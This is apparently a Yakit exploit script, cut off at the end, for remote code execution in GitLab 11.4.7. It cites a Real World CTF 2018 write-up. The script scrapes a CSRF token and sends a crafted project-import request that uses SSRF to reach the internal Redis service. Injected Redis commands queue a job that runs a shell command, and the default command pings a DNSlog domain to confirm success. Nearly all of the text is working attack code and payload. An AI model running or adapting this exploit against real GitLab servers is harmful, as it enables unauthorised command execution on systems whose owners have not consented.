yakit.AutoInitYakit()

# reference: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/

target = cli.String("Target")
cookie = cli.String("Cookie")
authenticity_token = cli.String("authenticity_token")
dnslog = cli.String("dnslog")
isHttps = cli.Bool("isHttps")
debug = cli.Bool("debug")

if dnslog == ""{
    dnslog, domainName, err = risk.NewDNSLogDomain()
    selfDNSLOG = false
    die(err)
}else{
    selfDNSLOG  = true
}

# wanna another command? change cmd here :)
cmd ="ping -c 1 " + dnslog

if debug{
    println("target: ", target)
    println("authenticity_token:", authenticity_token)
    println("dnslog: ", dnslog)
    println("isHttps: ", isHttps)
    println("debug: ", debug)
}

## function definitions.
getToken = func(target, isHttps) {

    if isHttps{
        target = "https://" + target
    }else{
        target = "http://" + target
    }
    rsp, err = http.Get(target)
    if err != nil{
        return ""
    }

    content, err = http.dump(rsp)
    if err != nil{
        return ""
    }

    _, body = str.SplitHTTPHeadersAndBodyFromPacket(content)

    node, err = xpath.LoadHTMLDocument(body)
    if err != nil{
        return ""
    }

    metaNode = xpath.FindOne(node, `//meta[17]`)

    if metaNode == nil{
        yakit.Output("failed to find csrf-token 1 ")
        return ""
    }

    if metaNode.Attr[0]["Val"] != "csrf-token"{
        yakit.Output("failed to find csrf-token 2 ")
        return ""
    }  

    csrfToken = metaNode.Attr[1]["Val"]
    yakit.Output("csrfToken Found: "+string(csrfToken))

    return csrfToken
}

randomProjName = func(){
    return str.RandStr(15)
}

sendPoc = func(target, Cookie, csrfToken, cmd, isHttps, dnslog){
    # strip blanks
    csrfToken = codec.EncodeUrl(str.TrimSpace(csrfToken))
    Cookie = str.TrimSpace(Cookie)

    if debug{
        println(dnslog)
    }

    Poc = `POST /projects HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Length: 361
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: identity
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: {{params(Cookie)}}
Origin: {{params(https)}}://{{params(target)}}
Referer: {{params(https)}}://{{params(target)}}/projects/new
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&authenticity_token={{params(csrftoken)}}&project%5Bimport_url%5D=git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2F{{params(randomProj)}}%2Fssrf.git
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|setsid {{params(cmd)}} \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
 exec&project%5Bci_cd_only%5D=false&project%5Bname%5D={{params(randomProj)}}&project%5Bnamespace_id%5D=1&project%5Bpath%5D={{params(randomProj)}}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0`
    https = ""
    if isHttps{
        https = "https"
    }else{
        https = "http"
    }

    params = poc.params({
        "target": target,
        "Cookie": Cookie,
        "randomProj": randomProjName(),
        "cmd": cmd,
        "csrftoken": csrfToken,
        "https": https,
        "noRedirect": true,
    })

    if debug{
        rsp, _, err = poc.HTTP(
            Poc, 
            params,
            poc.proxy("localhost:8083"), # yakit proxy
        )
    }else{
        rsp, _, err = poc.HTTP(
            Poc,
            params,
        )
    }

    ret ,err = risk.CheckDNSLogByToken(dnslog)
    if err != nil{
        return false, false
    }

    return ret, true
}

if authenticity_token == "bPuScR07gC9tY75UxUZLPOjJv1juTCtdJjhZ6X7YYFDVFT7TyKyxFnurLJIhlKPsgPbo9G8P1a2t8WXDiqEuJw%3D%3D"{
    authenticity_token = getToken(target, isHttps)
}

## logic codes.
if authenticity_token == "bPuScR07gC9tY75UxUZLPOjJv1juTCtdJjhZ6X7YYFDVFT7TyKyxFnurLJIhlKPsgPbo9G8P1a2t8WXDiqEuJw%3D%3D"{
